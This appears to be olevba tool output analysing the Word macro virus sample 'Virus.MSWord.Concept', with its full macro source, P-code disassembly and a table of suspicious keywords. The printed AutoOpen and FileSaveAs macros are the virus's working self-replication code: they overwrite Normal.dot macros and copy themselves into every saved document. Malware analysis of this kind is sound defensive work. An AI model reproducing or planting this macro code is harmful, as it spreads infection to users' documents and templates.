olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Concept
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Concept - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Concept - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Concept - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error Resume Next
WordBasic.ToolsMacro Name:="Normal.dot:AAAZA" + "O", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:AAAZF" + "S", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileSaveAs", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileSave", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileNew", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:PayLoad", Delete:=1
WordBasic.ToolsMacro Name:="Normal.dot:FileOpen", Delete:=1


On Error GoTo -1: On Error GoTo Abort
sMe$ = WordBasic.[FileName$]()

sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"

sTMacro$ = sMe$ + ":FileSave"
WordBasic.MacroCopy sTMacro$, "Global:Filesave"

sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy sTMacro$, "Global:FileSaveAs"

sTMacro$ = sMe$ + ":FileNew"
WordBasic.MacroCopy sTMacro$, "Global:FileNew"

sTMacro$ = sMe$ + ":FileOpen"
WordBasic.MacroCopy sTMacro$, "Global:FileOpen"

sTMacro$ = sMe$ + ":Payb"
WordBasic.MacroCopy sTMacro$, "Global:PayLoad"

WordBasic.MsgBox "Your system may or may not be clean. Please close CleanW and the open it AGAIN."
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Concept - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()

sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$

sTMacro$ = sMe$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$

sTMacro$ = sMe$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSave", sTMacro$

sTMacro$ = sMe$ + ":FileNew"
WordBasic.MacroCopy "Global:FileNew", sTMacro$

WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Concept
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSave - 1026 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	EndSub 
' Macros/VBA/AutoOpen - 2556 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitStr 0x0010 "Normal.dot:AAAZA"
' 	LitStr 0x0001 "O"
' 	Add 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #6:
' 	LitStr 0x0010 "Normal.dot:AAAZF"
' 	LitStr 0x0001 "S"
' 	Add 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #7:
' 	LitStr 0x0015 "Normal.dot:FileSaveAs"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #8:
' 	LitStr 0x0013 "Normal.dot:FileSave"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #9:
' 	LitStr 0x0012 "Normal.dot:FileNew"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #10:
' 	LitStr 0x0012 "Normal.dot:PayLoad"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #11:
' 	LitStr 0x0013 "Normal.dot:FileOpen"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0002 
' Line #12:
' Line #13:
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #16:
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #18:
' 	Ld sTMacro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	Ld sTMacro$ 
' 	LitStr 0x000F "Global:Filesave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' Line #23:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sTMacro$ 
' Line #24:
' 	Ld sTMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' Line #26:
' 	Ld sMe$ 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	St sTMacro$ 
' Line #27:
' 	Ld sTMacro$ 
' 	LitStr 0x000E "Global:FileNew"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' Line #29:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St sTMacro$ 
' Line #30:
' 	Ld sTMacro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' Line #32:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":Payb"
' 	Add 
' 	St sTMacro$ 
' Line #33:
' 	Ld sTMacro$ 
' 	LitStr 0x000E "Global:PayLoad"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' Line #35:
' 	LitStr 0x004F "Your system may or may not be clean. Please close CleanW and the open it AGAIN."
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #36:
' 	Label Abort 
' Line #37:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2384 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #11:
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sTMacro$ 
' Line #16:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	St sTMacro$ 
' Line #22:
' 	LitStr 0x000E "Global:FileNew"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' Line #24:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #25:
' 	GoTo Done 
' Line #26:
' Line #27:
' 	Label Bail 
' Line #28:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label Done 
' Line #32:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

